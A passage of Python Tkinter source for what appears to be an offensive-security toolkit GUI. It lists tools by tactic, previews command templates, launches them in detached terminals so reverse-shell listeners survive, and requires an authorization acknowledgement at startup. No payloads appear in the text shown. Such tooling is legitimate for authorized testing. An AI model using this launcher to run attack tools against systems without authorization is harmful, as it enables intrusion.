        btns = ttk.Frame(detail)
        btns.pack(fill="x", pady=(6, 0))
        self.btn_launch = ttk.Button(btns, text="Launch in terminal", command=self._launch)
        self.btn_launch.pack(side="left")
        self.btn_copy = ttk.Button(btns, text="Copy command", command=self._copy_cmd)
        self.btn_copy.pack(side="left", padx=6)
        self.btn_install = ttk.Button(btns, text="Show install hint", command=self._install_hint)
        self.btn_install.pack(side="left")
        self.btn_docs = ttk.Button(btns, text="Open docs", command=self._open_docs)
        self.btn_docs.pack(side="left", padx=6)
        paned.add(right, weight=3)

        # Status bar
        bar = ttk.Frame(self)
        bar.pack(fill="x", pady=(8, 0))
        ttk.Label(bar, textvariable=self.var_status, anchor="w").pack(side="left")
        ttk.Button(bar, text="Rescan tools", command=self._scan_tools_async).pack(side="right")

    # -- population -------------------------------------------------------- #
    def _populate_tactics(self) -> None:
        for i, tac in enumerate(TACTICS):
            self.tactic_tree.insert("", "end", iid=str(i),
                                    text=f"{tac.tid}  •  {tac.name}")
        # selection_set fires <<TreeviewSelect>> synchronously (the binding is
        # already attached from _build_widgets), which calls _show_tactic(0)
        # for us -- the old code then called it again explicitly right after,
        # doing the same render twice for no reason.                 # CHANGED
        self.tactic_tree.selection_set("0")
        self.tactic_tree.focus("0")

    def _on_tactic_select(self, _event: object) -> None:
        sel = self.tactic_tree.selection()
        if sel:
            self._show_tactic(int(sel[0]))

    def _show_tactic(self, index: int, preserve_selection: bool = False) -> None:
        """Render `index`'s tool list. With preserve_selection=True (used by a
        tools rescan refreshing the *same* tactic), re-select whatever tool
        was previously selected instead of wiping the detail pane.  # CHANGED
        """
        tac = TACTICS[index]
        self.tactic_desc.configure(text=f"{tac.name} ({tac.tid}) — {tac.desc}")
        self._current_tools = list(tac.tools)
        prev_iid = self._selected_tool_iid if preserve_selection else None

        self.tool_tree.delete(*self.tool_tree.get_children())
        for j, tool in enumerate(tac.tools):
            status, tag = self._status_for(tool)
            self.tool_tree.insert("", "end", iid=str(j), text=tool.name,
                                  values=(status,), tags=(tag,))

        if prev_iid is not None and self.tool_tree.exists(prev_iid):
            self.tool_tree.selection_set(prev_iid)  # re-fires _on_tool_select
            self.tool_tree.focus(prev_iid)
        else:
            self._clear_detail()

    def _status_for(self, tool: Tool) -> tuple:
        if tool.binary is None:
            return ("reference", "ref")
        with self._installed_lock:
            known = self._installed.get(tool.binary)
        if known is None:
            return ("…", "ref")
        return ("yes", "yes") if known else ("no", "no")

    def _clear_detail(self) -> None:
        self._selected_tool = None
        self._selected_tool_iid = None
        self.detail_desc.configure(text="Select a tool.")
        self._set_cmd_text("")

    def _on_tool_select(self, _event: object) -> None:
        sel = self.tool_tree.selection()
        if not sel:
            return
        self._selected_tool_iid = sel[0]
        tool = self._current_tools[int(sel[0])]
        self._selected_tool = tool
        self.detail_desc.configure(text=tool.desc)
        if tool.cmd:
            self._render_command_preview(tool)
        elif tool.binary is None:
            self._set_cmd_text("(Reference resource — no launchable command.)")
        else:
            self._set_cmd_text("(No command template.)")

    def _refresh_preview(self, *_args) -> None:
        """NEW: StringVar trace callback -- re-render the preview whenever an
        engagement variable changes, so the box (and Copy command) never show
        a command resolved against stale field values."""
        tool = self._selected_tool
        if tool is not None and tool.cmd:
            self._render_command_preview(tool)

    def _missing_fields(self, tool: Tool) -> List[str]:
        """NEW: required fields that are currently blank, for the inline
        preview hint. validate_context() at launch time is still the actual
        enforcement point (it also checks format, not just presence)."""
        ctx = self.context()
        return [f for f in required_fields(tool) if not ctx.get(f, "").strip()]

    def _render_command_preview(self, tool: Tool) -> None:
        """NEW: shared by _on_tool_select and _refresh_preview."""
        resolved = resolve_command(tool.cmd, self.context())
        missing = self._missing_fields(tool)
        if missing:
            resolved += f"\n⚠ missing: {', '.join(missing)}"
        self._set_cmd_text(resolved)

    def _set_cmd_text(self, text: str) -> None:
        self.cmd_text.configure(state="normal")
        self.cmd_text.delete("1.0", "end")
        self.cmd_text.insert("1.0", text)
        self.cmd_text.configure(state="disabled")

    # -- actions ----------------------------------------------------------- #
    def _ensure_out_dir(self) -> bool:
        path = os.path.expanduser(self.var_out.get().strip())
        try:
            os.makedirs(path, exist_ok=True)
            return True
        except OSError as exc:
            messagebox.showerror("Output directory", f"Could not create '{path}':\n{exc}")
            return False

    def _launch(self) -> None:
        tool = self._selected_tool
        if not tool or not tool.cmd:
            messagebox.showinfo("Nothing to launch",
                                "This entry is a reference resource with no command.")
            return

        fields = required_fields(tool)                      # CHANGED: auto-derived
        err = validate_context(fields, self.context())
        if err:
            messagebox.showwarning("Missing/invalid input", err)
            return

        # CHANGED: only touch the loot directory for tools that actually use
        # {out}. Previously this ran unconditionally, so e.g. "sudo -l" or
        # "crontab -l" would fail to launch if the (irrelevant to them) loot
        # directory couldn't be created.
        if "out" in fields and not self._ensure_out_dir():
            return

        # Warn if the tool isn't installed rather than spawning a failing shell.
        if tool.binary and self._installed.get(tool.binary) is False:
            if not messagebox.askyesno(
                    "Tool not found",
                    f"'{tool.binary}' was not found on PATH.\n"
                    f"Launch anyway?"):
                return

        builder = detect_terminal()
        if builder is None:
            messagebox.showerror(
                "No terminal emulator",
                "Could not find a supported terminal emulator on PATH "
                "(tried qterminal, mate-terminal, gnome-terminal, xterm, …).")
            return

        inner = resolve_command(tool.cmd, self.context())
        wrapped = (f"{inner}; ec=$?; echo; "
                   f"echo \"[toolkit] finished (exit $ec)\"; "
                   f"read -rn1 -p 'Press any key to close…'")
        argv = builder(wrapped)
        try:
            # start_new_session=True detaches the terminal -- and whatever
            # long-running listener/handler it's running -- into its own
            # process group/session, so closing this GUI or hitting Ctrl+C in
            # whatever shell launched it can't take an active reverse-shell
            # listener down with it.                                 # CHANGED
            subprocess.Popen(argv, close_fds=True, start_new_session=True)
            self.var_status.set(f"Launched: {tool.name}  ({argv[0]})")
        except (OSError, ValueError) as exc:
            messagebox.showerror("Launch failed", f"{exc}")

    def _copy_cmd(self) -> None:
        text = self.cmd_text.get("1.0", "end").strip()
        if not text:
            return
        try:
            self.master.clipboard_clear()
            self.master.clipboard_append(text)
            self.var_status.set("Command copied to clipboard.")
        except tk.TclError as exc:   # NEW: no clipboard manager (minimal/headless WM)
            messagebox.showerror("Clipboard unavailable", f"{exc}")

    def _install_hint(self) -> None:
        tool = self._selected_tool
        if not tool:
            return
        if tool.install:                         # CHANGED: explicit override wins
            hint = tool.install
        elif tool.pkg:
            hint = f"sudo apt update && sudo apt install -y {tool.pkg}"
        elif tool.binary:
            hint = (f"'{tool.name}' is usually installed from source or a project "
                    f"release rather than apt. Check the docs link.")
        else:
            hint = "This is a reference resource, not an installable package."
        messagebox.showinfo(f"Install: {tool.name}", hint)

    def _open_docs(self) -> None:
        tool = self._selected_tool
        if not (tool and tool.url):
            messagebox.showinfo("No link", "No documentation link recorded for this entry.")
            return
        try:
            webbrowser.open(tool.url)
        except webbrowser.Error as exc:   # NEW: no browser registered on this system
            messagebox.showerror("Could not open browser", f"{exc}\n\nURL: {tool.url}")

    # -- tool scan --------------------------------------------------------- #
    def _scan_tools_async(self) -> None:
        self.var_status.set("Scanning installed tools…")
        threading.Thread(target=self._scan_tools_worker, daemon=True).start()

    def _scan_tools_worker(self) -> None:
        binaries = {t.binary for tac in TACTICS for t in tac.tools if t.binary}
        found = {b: (shutil.which(b) is not None) for b in binaries}
        with self._installed_lock:
            self._installed = found
        installed_count = sum(1 for v in found.values() if v)
        # Marshal UI updates back onto the Tk main thread.
        self.after(0, lambda: self._on_scan_done(installed_count, len(found)))

    def _on_scan_done(self, installed: int, total: int) -> None:
        self.var_status.set(
            f"{installed}/{total} launchable tools present on this host. "
            f"Missing tools show an install hint.")
        sel = self.tactic_tree.selection()
        if sel:
            # CHANGED: preserve whatever tool was selected/being edited
            # instead of wiping the detail pane on every rescan.
            self._show_tactic(int(sel[0]), preserve_selection=True)


# --------------------------------------------------------------------------- #
# Authorization gate                                                          #
# --------------------------------------------------------------------------- #
def authorization_gate(root: tk.Tk) -> bool:
    """Blocking acknowledgement. Returns True only on explicit confirmation."""
    return messagebox.askyesno(
        f"{APP_NAME} — Authorization required",
        "This toolkit launches offensive security tools.\n\n"
        "Use it ONLY against systems you are explicitly authorized to test "
        "under a signed engagement / rules of engagement, or in a lab you own.\n\n"
        "Unauthorized access to computer systems is illegal.\n\n"
        "Do you confirm you have written authorization for your target scope?",
        icon="warning", default="no",
    )


def main() -> int:
    root = tk.Tk()
    root.withdraw()
    try:
        ttk.Style().theme_use("clam")
    except tk.TclError:
        pass
    if not authorization_gate(root):
        root.destroy()
        return 1
    root.deiconify()
    ToolkitApp(root)
    root.mainloop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
